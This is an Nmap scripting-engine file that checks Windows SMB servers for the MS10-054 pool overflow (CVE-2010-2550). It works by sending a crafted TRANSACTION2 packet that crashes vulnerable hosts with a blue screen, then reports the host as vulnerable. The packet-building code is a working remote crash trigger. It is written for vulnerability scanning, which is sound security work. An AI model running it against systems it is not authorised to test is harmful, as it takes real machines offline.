local bin = require "bin"
local msrpc = require "msrpc"
local smb = require "smb"
local string = require "string"
local vulns = require "vulns"
local stdnse = require "stdnse"

description = [[
Tests whether target machines are vulnerable to the ms10-054 SMB remote memory 
corruption vulnerability.

The vulnerable machine will crash with BSOD. 

The script requires at least READ access right to a share on a remote machine.
Either with guest credentials or with specified username/password. 

]]

---
-- @usage nmap  -p 445 <target> --script=smb-vuln-ms10-054 --script-args unsafe
--
-- @args unsafe Required to run the script, "safty swich" to prevent running it by accident
-- @args smb-vuln-ms10-054.share Share to connect to (defaults to SharedDocs)
-- @output
-- Host script results:
-- | smb-vuln-ms10-054:
-- |   VULNERABLE:
-- |   SMB remote memory corruption vulnerability
-- |     State: VULNERABLE
-- |     IDs:  CVE:CVE-2010-2550
-- |     Risk factor: HIGH  CVSSv2: 10.0 (HIGH) (AV:N/AC:L/Au:N/C:C/I:C/A:C)
-- |     Description:
-- |       The SMB Server in Microsoft Windows XP SP2 and SP3, Windows Server 2003 SP2,
-- |       Windows Vista SP1 and SP2, Windows Server 2008 Gold, SP2, and R2, and Windows 7
-- |       does not properly validate fields in an SMB request, which allows remote attackers
-- |       to execute arbitrary code via a crafted SMB packet, aka "SMB Pool Overflow Vulnerability."
-- |
-- |     Disclosure date: 2010-08-11
-- |     References:
-- |       http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-2550
-- |_      http://seclists.org/fulldisclosure/2010/Aug/122

author = "Aleksandar Nikolic"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = {"vuln","intrusive","dos"}

hostrule = function(host)
	return smb.get_port(host) ~= nil
end

-- stolen from smb.lua as max data count needed to be modified to trigger the crash
local function send_transaction2(smbstate, sub_command, function_parameters)
	local header, parameters, data, command
	local parameter_offset = 0
	local parameter_size   = 0
	local data_offset      = 0
	local data_size        = 0
	local total_word_count, total_data_count, reserved1, parameter_count, parameter_displacement, data_count, data_displacement, setup_count, reserved2
	local response = {}

	-- Header is 0x20 bytes long (not counting NetBIOS header).
	header = smb.smb_encode_header(smbstate, smb.command_codes['SMB_COM_TRANSACTION2'], {}) -- 0x32 = SMB_COM_TRANSACTION2
	
	if(function_parameters) then
		parameter_offset = 0x44
		parameter_size = #function_parameters
		data_offset = #function_parameters + 33 + 32
	end
	
	-- Parameters are 0x20 bytes long. 
	parameters = bin.pack("<SSSSCCSISSSSSCCS",
					parameter_size,                  -- Total parameter count. 
					data_size,                       -- Total data count. 
					0x000a,                          -- Max parameter count.
					0x000a,                          -- Max data count, less than 12 causes a crash
					0x00,                            -- Max setup count.
					0x00,                            -- Reserved.
					0x0000,                          -- Flags (0x0000 = 2-way transaction, don't disconnect TIDs).
					0x00001388,                      -- Timeout (0x00000000 = return immediately).
					0x0000,                          -- Reserved.
					parameter_size,                  -- Parameter bytes.
					parameter_offset,                -- Parameter offset.
					data_size,                       -- Data bytes.
					data_offset,                     -- Data offset.
					0x01,                            -- Setup Count
					0x00,                            -- Reserved
					sub_command                      -- Sub command
	)

	local data = "\0\0\0" .. (function_parameters or '')

	-- Send the transaction request
	stdnse.print_debug(2, "SMB: Sending SMB_COM_TRANSACTION2")
	local result, err = smb.smb_send(smbstate, header, parameters, data, {})
	if(result == false) then
		return false, err
	end

	return true
end

action = function(host,port)
	if not stdnse.get_script_args(SCRIPT_NAME .. '.unsafe') then
		stdnse.print_debug("You must specify unsafe script argument to run this script.")
		return false
	end
	local ms10_054  = {
		title = "SMB remote memory corruption vulnerability",
		IDS = {CVE = 'CVE-2010-2550'},
		risk_factor = "HIGH",
		scores = {
		  CVSSv2 = "10.0 (HIGH) (AV:N/AC:L/Au:N/C:C/I:C/A:C)",
		},
		description = [[
The SMB Server in Microsoft Windows XP SP2 and SP3, Windows Server 2003 SP2, 
Windows Vista SP1 and SP2, Windows Server 2008 Gold, SP2, and R2, and Windows 7
does not properly validate fields in an SMB request, which allows remote attackers
to execute arbitrary code via a crafted SMB packet, aka "SMB Pool Overflow Vulnerability."
		]],
		references = {
		  'http://seclists.org/fulldisclosure/2010/Aug/122',
		  'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-2550'
		},
		dates = {
		  disclosure = {year = '2010', month = '08', day = '11'},
		},
		exploit_results = {},
	}

	local report = vulns.Report:new(SCRIPT_NAME, host, port)
	ms10_054.state = vulns.STATE.NOT_VULN
	
	local share = stdnse.get_script_args(SCRIPT_NAME .. '.share') or "SharedDocs"
	
	local status, smbstate = smb.start_ex(host, true, true, share, nil, nil, nil)
	
	local param = "0501" -- Query FS Attribute Info
	local status, result = send_transaction2(smbstate,0x03,bin.pack("H",param))
	status, result = smb.smb_read(smbstate,true) -- see if we can still talk to the victim 
	if not status then -- if not , it has crashed
		ms10_054.state = vulns.STATE.VULN
	else	
		stdnse.print_debug("Machine is not vulnerable")
	end
	return report:make_output(ms10_054)
end
